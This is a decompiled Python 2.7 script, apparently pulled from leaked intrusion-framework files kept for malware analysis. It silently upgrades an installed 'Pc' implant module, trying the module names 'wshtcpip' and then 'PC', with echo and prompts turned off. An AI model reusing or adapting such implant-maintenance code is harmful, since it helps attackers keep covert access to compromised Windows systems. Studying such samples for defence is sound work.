# uncompyle6 version 3.8.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:19:08) [MSC v.1500 32 bit (Intel)]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: _Upgrade.py
import dsz, dsz.lp
dsz.lp.AddResDirToPath('DeMi')
import demi, demi.windows.module, glob, os, re, shutil, sys

def main():
    dsz.control.echo.Off()
    localFile = sys.argv[1]
    procName = sys.argv[2]
    upgradedFromNewer = demi.windows.module.Upgrade('Pc', localFile, 'wshtcpip', demi.registry.PC.Id, ask=False)
    if not upgradedFromNewer:
        dsz.ui.Echo('    NOT FOUND, Must retry with older name...', dsz.GOOD)
    return upgradedFromNewer or demi.windows.module.Upgrade('Pc', localFile, 'PC', demi.registry.PC.Id, ask=False)


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)
# okay decompiling D:\work\malware\bvp47\FB\Resources\Pc\PyScripts\Install\winnt\KiSu\_Upgrade.pyo
